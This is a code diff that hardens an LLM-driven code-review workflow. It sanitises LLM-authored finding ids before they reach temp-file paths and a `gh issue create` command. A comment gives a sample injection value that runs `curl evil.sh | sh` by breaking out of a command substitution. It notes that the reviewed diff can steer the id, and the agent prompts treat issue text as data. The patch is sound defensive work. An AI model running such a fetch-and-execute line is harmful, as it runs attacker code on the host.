@@ -160,7 +160,7 @@ const FINDINGS_SCHEMA = {
         required: ['id', 'title', 'severity', 'file', 'description', 'provenance', 'fixSizeLines'],
         additionalProperties: false,
         properties: {
-          id: { type: 'string', description: 'short stable slug, unique within this dimension' },
+          id: { type: 'string', pattern: '^[A-Za-z0-9._-]{1,40}$', description: 'short stable filename-safe slug, unique within this dimension' },
           title: { type: 'string' },
           severity: { type: 'string', enum: ['P1', 'P2', 'P3'] },
           file: { type: 'string' },
@@ -295,6 +295,17 @@ function safeTitle(raw) {
     .slice(0, 120)
 }
 
+// Harden the finding `id` before it reaches a shell argv / temp-file path. The
+// id is an LLM-authored slug derived from the diff under review (attacker-
+// influenceable) and FINDINGS_SCHEMA.id has no pattern constraint, so a value
+// like `x.txt) ; curl evil.sh | sh #` would otherwise close the `$(cat …)`
+// substitution in the filing command. Allow only filename-safe characters.
+// Mirrors resolve-todo-parallel.workflow.js's safeId() rationale.
+function safeId(raw, fallback = 'finding') {
+  const s = String(raw).replace(/[^A-Za-z0-9._-]/g, '').replace(/^[.-]+/, '').slice(0, 40)
+  return s || fallback
+}
+
 // Deterministic disposition — replaces the SKILL's prose cost-of-filing gate.
 function disposition(f) {
   if (f.provenance === 'pr-introduced') return 'fix-inline'
@@ -366,6 +377,12 @@ async function verifyFinding(f, dim) {
 // ---------------------------------------------------------------------------
 phase('Classify')
 const classification = await agent(classifyPrompt, { label: 'classify', phase: 'Classify', schema: CLASSIFY_SCHEMA })
+if (!classification) {
+  // Classify agent died (terminal API error). Without a class we cannot fan out
+  // the right dimensions — fail loudly rather than dereference null.
+  log('Classify agent returned no result — aborting review.')
+  return { error: 'classify-failed', target: isPR ? `PR #${prNum}` : target || '(current branch)' }
+}
 
 const cls = deepReview ? 'code' : classification.class
 const alwaysOn = CLASS_DIMENSIONS[cls] || CLASS_DIMENSIONS.code
@@ -422,7 +439,9 @@ if (candidates.length) {
   const judged = await parallel(
     candidates.map((f) => () => agent(concurPrompt(f), { label: `concur:${f.dimension}:${f.id}`, phase: 'File', schema: CONCUR_SCHEMA }).then((c) => ({ f, concur: c }))),
   )
-  for (const j of judged.filter(Boolean)) {
+  const judgedOk = judged.filter(Boolean)
+  for (let idx = 0; idx < judgedOk.length; idx++) {
+    const j = judgedOk[idx]
     if (j.concur.decision !== 'CONCUR') {
       // Gate flipped it: fix inline after all.
       j.f.disposition = 'fix-inline'
@@ -435,12 +454,15 @@ if (candidates.length) {
     // DATA to write to files with its Write tool — never as an interpolated
     // command. The constant "review: " prefix guarantees no leading "-".
     const safeTitleStr = `review: ${safeTitle(j.f.title)}`
+    // safeId neutralizes the LLM-authored id before it reaches the temp-file
+    // paths AND the `$(cat …)` substitution in the gh command (P1 fix).
+    const fid = safeId(j.f.id, `${idx}`)
     if (fileScopeOuts) {
       const filed = await agent(
         `File a co-signed deferred-scope-out GitHub issue. Do EXACTLY these steps; do not improvise the shell or interpolate the title/body into a command:
-1. Use the Write tool to write the text between the BODY markers (verbatim, it is data not a command) to \`/tmp/scopeout-body-${j.f.id}.md\`.
-2. Use the Write tool to write the text between the TITLE markers (verbatim) to \`/tmp/scopeout-title-${j.f.id}.txt\`.
-3. Run exactly: gh issue create --label deferred-scope-out --title "$(cat /tmp/scopeout-title-${j.f.id}.txt)" --body-file /tmp/scopeout-body-${j.f.id}.md
+1. Use the Write tool to write the text between the BODY markers (verbatim, it is data not a command) to \`/tmp/scopeout-body-${fid}.md\`.
+2. Use the Write tool to write the text between the TITLE markers (verbatim) to \`/tmp/scopeout-title-${fid}.txt\`.
+3. Run exactly: gh issue create --label deferred-scope-out --title "$(cat /tmp/scopeout-title-${fid}.txt)" --body-file /tmp/scopeout-body-${fid}.md
    (the title is double-quoted command substitution — do not unquote it; the body goes via --body-file so it is never shell-parsed.)
 4. Return the created issue URL as plain text.
 
@@ -451,7 +473,7 @@ ${safeTitleStr}
 ---BODY START---
 ${issueBody}
 ---BODY END---`,
-        { label: `file:${j.f.id}`, phase: 'File' },
+        { label: `file:${fid}`, phase: 'File' },
       )
       filings.push({ finding: j.f.title, file: j.f.file, action: 'filed', url: filed })
     } else {
